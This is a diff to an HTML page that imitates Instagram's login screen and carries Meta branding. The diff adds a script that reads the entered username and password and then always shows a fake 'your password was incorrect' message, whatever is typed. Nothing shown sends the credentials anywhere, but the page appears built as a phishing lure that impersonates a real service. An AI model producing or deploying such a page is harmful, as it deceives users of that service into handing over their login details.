@@ -58,7 +58,19 @@
             }
         }
 
-        form {
+            .error-message {
+                color: #ed4956;
+                font-size: 14px;
+                margin: 10px auto;
+                text-align: center;
+                display: none;
+                max-width: 350px;
+                width: 100%;
+                padding: 0 40px;
+                line-height: 1.4;
+            }
+
+            form {
             width: 100%;
             display: flex;
             flex-direction: column;
@@ -80,9 +92,7 @@
                 background-color: #fafafa;
                 border: 1px solid rgb(183, 180, 180);
                 border-radius: 2px;
-            }
-
-            input,
+            }            input,
             textarea,
             select {
                 padding: 8px 0.5rem;
@@ -348,7 +358,7 @@
             <form action="#">
                 <input type="text" placeholder="Phone number, username or email" name="" id="uname" required>
                 <input type="password" placeholder="Password" name="" id="upass" required>
-                <input id="btn" type="button" value="Log in">
+                <button id="btn" type="submit">Log in</button>
             </form>
             <div class="section-1">
                 <section class="con-1">
@@ -365,6 +375,7 @@
                         href="https://m.facebook.com/ig/login_via/app/?next=https%3A%2F%2Fwww.facebook.com%2Foidc%2F%3Fapp_id%3D124024574287414%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignupviafb%252F%26response_type%3Dcode%26scope%3Dopenid%2Bemail%2Bprofile%2Blinking%26state%3DATmjJGj_k-IqWVYoYOVaSMqtdE2X6nLt6erOopSA5edETvW0x0WMczvKCOcuuDvoGDUlpWO2TzhD5tAlXzmBbaN31vQQ1Fs6Qv6YfZCp7jWZ7EhmjFpxCRwAgrA61THItDQZZqNY8HrofpmWMJ1Oa0arsBzkqlepeI8pEuR6RvFjvWoLjByvuCpx9MPXUZD-4iSRbHmmm5K2tzrTgSo1aveBXvIjfvkqT2ih7lTJcpzcCaa5vomU_Vm9HKURiRrk5YaM&refsrc=deprecated&lid=0BChSbEeYEDoViKIV&bn=Y29tLmFuZHJvaWQuY2hyb21l&tade=Q7fLBQHTupcaVn4IaS%2By9EC1JqvlqHSsoG0%2BNup5yIBMle9dylLbzdA1lAbmagdzYaoWyS7rjKSf0kRGMKxxV%2BcU65eq1gvul2UAc5XOElypCDKIVAgbK9kjwQ9hQLSXxTv2lpLhfw%3D%3D">Log
                         in with Facebook</a></p>
             </div>
+            <div class="error-message" id="error-message">Sorry, your password was incorrect. Please double-check your password.</div>
             <div class="section-3">
                 <a href="#">Forgot password?</a>
             </div>
@@ -392,6 +403,23 @@
         </div>
         <p> &copy; 2025 Instagram from Meta </p>
     </footer>
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const form = document.querySelector('form');
+            const errorMessage = document.getElementById('error-message');
+            
+            form.addEventListener('submit', function(e) {
+                e.preventDefault();
+                
+                const username = document.getElementById('uname').value;
+                const password = document.getElementById('upass').value;
+                
+                if (username || password) {
+                    errorMessage.style.display = 'block';
+                }
+            });
+        });
+    </script>
 </body>
 
 </html>
